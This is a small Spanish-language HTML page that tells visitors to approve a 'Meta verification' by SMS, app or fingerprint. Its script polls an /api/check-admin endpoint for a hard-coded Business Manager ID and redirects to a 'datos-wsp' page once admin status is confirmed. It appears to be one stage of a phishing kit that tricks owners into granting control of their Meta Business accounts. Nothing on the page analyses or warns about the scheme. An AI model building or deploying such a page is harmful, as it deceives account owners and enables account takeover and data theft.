<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Verificando</title>
<style>body{font-family:system-ui;background:#f6f7f8;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0} .card{background:#fff;padding:32px;border-radius:16px;max-width:420px;text-align:center}</style>
</head><body>
<div class="card">
<h2>⏳ Esperando tu aprobación</h2>
<p>Te abrimos verificación de Meta. Aprueba con SMS, app o huella.</p>
<small id="bid"></small>
<pre id="state" style="text-align:left;background:#f5f5f5;padding:12px;border-radius:8px;margin-top:12px;white-space:pre-wrap;max-height:200px;overflow:auto"></pre>
<a href="https://business.facebook.com/requests" target="_blank" style="display:block;margin-top:12px">Abrir business.facebook.com/requests</a>
</div>
<script>
const params = new URLSearchParams(window.location.search);
const BID = params.get('business_id') || '832691819931306';
document.getElementById('bid').innerText = 'BM: '+BID;
function check(){
  fetch(`/api/check-admin?business_id=${BID}`).then(r=>r.json()).then(j=>{
    document.getElementById('state').innerText = JSON.stringify(j,null,2);
    if(j.isAdmin) window.location.href = `/datos-wsp.html?business_id=${BID}`;
  });
}
setInterval(check,3000);
check();
</script>
</body></html>
